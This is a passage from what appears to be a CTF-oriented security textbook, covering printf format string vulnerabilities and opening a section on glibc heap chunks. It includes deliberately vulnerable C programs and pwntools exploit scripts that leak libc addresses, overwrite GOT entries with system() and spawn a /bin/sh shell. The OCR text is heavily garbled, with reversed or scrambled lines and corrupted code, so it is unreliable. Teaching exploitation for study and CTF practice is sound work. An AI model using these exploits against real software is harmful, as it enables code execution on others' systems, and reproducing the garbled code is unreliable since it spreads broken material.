with O on the left.
displayed on the right of the decimal point.
• For g and G, it indicates the maximum number of digits of a valid number.
•For the string type s, it indicates the max length of the output.
If the domain width is set to "*", the value of the corresponding parameter is the
current domain width of the precision.
Length indicates the length of a floating-point or integer parameter.
•hh  matches integer parameters int8 size (1 byte).
▪h  matches integer parameters of int16 size (2 bytes).
•1  matches integer arguments of long size for integers, double size for floating
point, wchar_t pointer for string s, and wint_t for character c.
*L  matches integer parameter that the size of a long double.
•Il  matches integer parameters of long long size.
*Z  matches integer parameter to size_t.
* j  matches integer parameters of size intmax_t.
•I  matches integer parameter that the size of ptrdiff_t.
---
## Page 464
6.5 Format String Vulnerabilities
451
The type is expressed as follows.
•d, i  Signed decimal int value.
•u  Decimal unsigned int value.
•f, F  decimal double value.
•e, E  double value, in decimal form “[-]d.ddd e[+/-]ddd"
*g, G  double numeric, automatically select f or e format according to the size of
the numeric value.
• x, X  hexadecimal unsigned int value.
• o  Octal unsigned int value.
• s  String ending with x00.
• c  A character of type char.
*p  void * pointer value.
*a  A -double hexadecimal representation, i.e. “[-JOxh.hhhhh p:±d", the exponent
part is in decimal form.
*n  Writes the number of characters that have been successfully output to the
address which indicat by the corresponding parameter.
▪%  the char *%', which does not accept any flags, width, precision or length.
If the format string of the printf can be controlled, the printf function will read and
write data from the register or stack corresponding to the format string. Which will
easily result in reading and writing arbitrary addresses.
6.5.2BasicFormat StringVulnerability Exploits
The format string vulnerability allows arbitrary read and write. Since function
dx%, snsn Aq paxea aq ueo qum *yoeis a qnon possed ae sunre
(X is any positive integer). Also, if you can control the data on the stack, you can
write the address you want to leak on the stack in advance, and then use *"%XSs" to
uns t se ssauppe au indno
In addition, since “%n’” writes the number of characters that have been success-
fully output to the address specified by the parameter. You can place the address you
want to overwrite on the stack in advance. Then use “% Yc%XSn" (Y is the data to be
m ro Aeqe  o (un
Example 6.4
#include
#include
int main(1 {
setbuf (stdin, 0) ;
setbuf (atderr, 0) :
setbuf (stdout, 0) ;
while (1) {
char format [100] :
puts (*input your name : *) ;
read(0, format, 100) :
---
## Page 465
452
6PWN
ras, [rtp - tc79] /* eoac7e4e
esofffrffe
 atx}
Fig, 6.13Stack layout
printf (format) :
printf (*hello*);
return 0;
Compile the program in Example 6.4 with the following command.
gcc fsb.c -o fsb -fstack-protector-a11 -pie -fPIE -z lazy
When we interrupt at printf(format), we can set the RSP is exactly the address of the
string we entered. So, it's the 6th parameter (the first 5 parameters of 64-bit Linux
and the formatted string are passed by the register). Then we enter *AAAAAAAAA
%6$p".
$ - /fsb
1nput your name :
he11o AAAAAAAAAA0x4141414141414141
AAAAAAAA+6Sp
 s asn uo am pue su aod se , snno uod 
information leak first.
The stack contains the address of _libc_start_main (see Fig. 6.13), we can
calculate the base address of libc by subtracting the offset.
$ - /fsb
input your name :
he11o 0x559ac59416d00x7f1b57374b97
$17Sp21$p
Once you have the libc base address, you can calculate the address of the system
function, and then modify the printf in GOT table to the system. The next time you
---
## Page 466
6.5 Format String Vulnerabilities
453
execute printf(format), you will actually execute system(format), type the format
qs a 1a3 o1 ,qs/uq/, se Suns
from pun import *
1ibc = ELF(' . /1ibc-2 .27.so′)
elf = ELF (' . /fsb')
P = process (1 . /fsb')
p.recvunti1 ('name : ′)
p . send1ine ("4175p$21Sp")
p .recvunti1 ("ox)
(9t * [z-=] (,xo ) quma.x*d) u = xppe
base = addr - elf .symbols ['_start ]
addx = int (p,recvunti1 (*\n′) [: -1] , 16)
Info ("base : Oxlx*, base)
1ibc_base = addr - 1ibc.symbols ['_1ibc_start_main*] -0xe7
info("1ibe:0xvx*, 1ibc_base)
system = 1ibc_base + 1ibc. symbols ['systen′]
info ("system: Oxlx", system)
cho = systemsoxffff
ch1 = (( (aystem>>16) &oxffff) -ch0) &oxffff
ch2 = ( ( (aystem>>32) &0xffff) - (cho+ch11) &0xffff
payload = *$*+str(ch0) +*c$12Shn"
payload += *"+stx(ch1) +*cv13Shn"
payload += *v"+stz (ch2) +*c14Shn*
payload = payload. 1just (48, 'a′)
pay1oad +=p64 (base+0x201028)
# printf 's address in the Gor table
pay1oad +=p64 (base+0x201028+2)
pay1oad +=p64 (base+0x201028+4)
p .sendline (payload)
p sendline (*/bin/sh^,xoo*)
p.interactive ()
If you output more than one int-type byte at a time, the printf will output several
gigabytes of data, which may be very slow in attacking remote servers or cause a
broken pipe. So The script splits the system address (6 bytes) into 3 words (2 bytes).
Note that in a 64-bit program, the address only takes up 6 bytes, which means that
the highest 2 bytes must be “"x00", so the three addresses must be placed at the end
of the payload. Although it is better to calculate the offset by putting them in the first
place, the printf will output the string until "x00", and the “x0o" in the address will
truncate the string, and the placeholder used to write the address will not take effect
afterwards.
---
## Page 467
454
6PWN
6.5.3WhenFormatString Noton theStack
Sometimes the input strings are not stored on the stack, so there is no way to directly
place the address on the stack to control the parameters of the printf, in which case it
is more complicated to exploit.
The program has operations such as push rbp into the stack or some pointer on the
stack when calling the function, there will be a lot of pointers on the stack with the
address on the stack. It is easy to find three pointer p1, p2 and p3, forming a situation
where p1 points to p2 and p2 points to p3, we can use p1 to modify the lowest 1 byte
Kue o1 ed Apxxu ueo nof os ssuod ed go sofq g a oi nuod zd ayeu o1 7d o
value you want byte by byte, indirectly controlling the data on the stack.
Example 6.5
#include
#include
void init (l {
setbuf (stdin, 0) ;
setbuf (stdout, 0) ;
setbuf (stderr, 0) ;
return;
void fsb (char+ fozmat, int n) {
puts (please input your name : *) ;
read (o, fornat, n) :
printf (*he11o") ;
printf (format) :
return;
void vuln [1 {
char * format = ma11oc (20o) :
for(int i=0; 1> {x*8))&0xff
# p3 pointer.
p.reevuntil (*name′)
(05 + oox , +uuus9t+ (qo) xs+) utpuos d
# Change the address of the p3 to the free_got address.
# At the end of the loop, the p3 is pointed to the address of the free
function in the GoT table
for i in range (o, 6) : 
# overvrite free_got to system
off = (free_got+i)&0xff
p.recvuntil(*name′)
p. sendline ("↓"+stx (off) +*c16Shhn"+'\x0o'*50)
p.recvunti1 (*name′)
ch = (≤ystem>> (1*8) )&0xff
p. sendline ("↓"+stx (ch) +*c20$hhn#+ '\x0o+ *50)
# Change free_got_ptr to point to the systen address.
# After the 1oop is completed, the pointer to the free function in the GoT
table points to the system # function address.
for i in range (30-25) :
p.recvunti1 ('name′)
p. sendline (/bin/sh′+'\,x0o′ +100)
# Change the format string to */bin/sh" and execute systen (* /bin/sh*)
p.interactive ()
6.5.4Some Special Uses ofFormat String
Format strings has some rare placeholders, such as “s** which takes the value of the
corresponding function argument as the width, and printf(*%*d", 3, 1) will outputs
“1".
Example 6.6
#include
#1nclude
#include
int main() {
char buf [100] ;
1ong long a=0;
int fp = open ("/dev/urandom*, o_RDoNLY) :
long 1ong b=0;
read (fp, sa, 2) ;
read (fp, sb, 2) ;
close (fp) ;
puta (*your name : ") ;
1ong long num;
read (0, buf, 100) ;
---
## Page 470
6.5  Format String Vulnerabilities
457
e:eeee
dbg> stack 28
01:0088
rsp
ex7ffffedfee--exb0145
02:0010
03:0018
ex1b2d
84:0020
05:0028
0x1
06:0038
Fig, 6.15 Stack layout
1ong long *num_ptr = num;
scanf (*$11d*, num_ptx) ;
printf (*he11o ") ;
printf (*let me see ...") ;
printf (buf) ;
if (a+b == num) {
put.s (you vin, I vi11 give you a ehe11:*) ;
system (/bin/sh*) ;
else 
put.s (you are not lucky enough") ;:
exit (0) ;
As in Example 6.6, you can get the shell after guessing the sum of two numbers
na o xea teo uns eo o ysnoe °t asnq uopisuoo jno oano
of the two numbers, but after the leak we have no chance modify the guess, so we
must take advantage of this opportunity, directly fill the num with the sum of a and b,
which requires the placeholder 
When we interrupt at printf(buf), and the data on the stack is shown in Fig. 6.15a
and b (0x1b2d and 0xc8e3) are the 8th and 9th parameterof printf, and num_ptr is the
11th parameter. We can make a and b as output width, the number of characters
output is the sum of a and b. Then the effect of num==a+b can be achieved by using
"%n" to write the value to num.
The script is as follows.
from pum import *
pay =*$+8$cv*9$c$115n"
{cqsg/.)esssoxd =d
p.recvunti1('name′)
p .sendline (pay)
p.recvunti1(′gift)
p.sendline ('1′)
p.interactive ()
---
## Page 471
458
6PWN
6.5.5FormatString Summary
In fact, format string is still converted to an arbitrary address read/write to complete
the exploit. If we can read and write to any address, then we are not far from
completing the exploit.
Sometimes programs will enable the Fortify protection mechanism so that all
printf() is replaced by printf_chkO when compiling. The difference between the
two is as follows.
•When using position parameters, you must use all parameters in the range instead
of using position parameters directly. For example, to use "%3Sx”, you must use 
‘ aues ap 1e ,xsz%, pue xs1%, qoq
•Format string which containing “%n" cannot be located at a writable memory.
• In this case, although it is difficult to write to an arbitrary address, it is still
possible to use arbitrary address read to leak information.
6.6 Heap
6.6.1What Is Heap?
Heap (chunk) memory is a memory area that allows a program to dynamically allocate
and use memory during runtime. In contrast to stack memory and global memory,
heap memory does not have a fixed lifetime or a fixed memory area, and programs can
dynamically request and release memory of different sizes. After being allocated, the
heap memory area is always valid if no explicit release operation is performed.
Glibc designs the Ptmalloc2 heap manager for efficient heap memory allocation,
recycling, and management. In this section, we will focus on the analysis and
exploitation of the Ptmalloc2 defects. Here we only introduce the basic structure
and concepts of Glibc version 2.25 and the new features added in version 2.26.
Please refer to the Ptmalloc2 source code for more details about the heap manager.
 si e deu oo a q poe ans o seq so u
chunk. Chunk's basic data structure is as follows.
stzuct mal1oc_chunk (
INTEsNAL_SIZE_T mchunk_prev_size ;
/+ Size of previous chunk
INTERNAL_SIZE_T mchunk_size ;
/+ Size in bytes, including
(if free) . */
struct mal1oc_chunk* fd;
/* double links -- used only if free. */
overhead. */
struct ma11oc_chunk+ bk;
/+ Only used for large blocks: pointer to next larger size. */
struct malloc_chunk* fd_nextsize;
free. */
/* double links -- used only if
struct ma1loc_chunk+ bk_nextsize ;
J :
---
## Page 472
6.6 Heap
459
The lower three bits of mchunk_size are fixed at O (sio1ooo2). In order to make
fulluse of memory space, the lower three bits of mchunk_ize store PREV_INUSE,
IS_MMAPPED, and NON_MAIN_ARENA
information respectively.
NON_MAIN_ARENA is used to record whether the current chunk does not belong
to the main thread, 1 means it does not, O means it does. IS_MAPPED used to record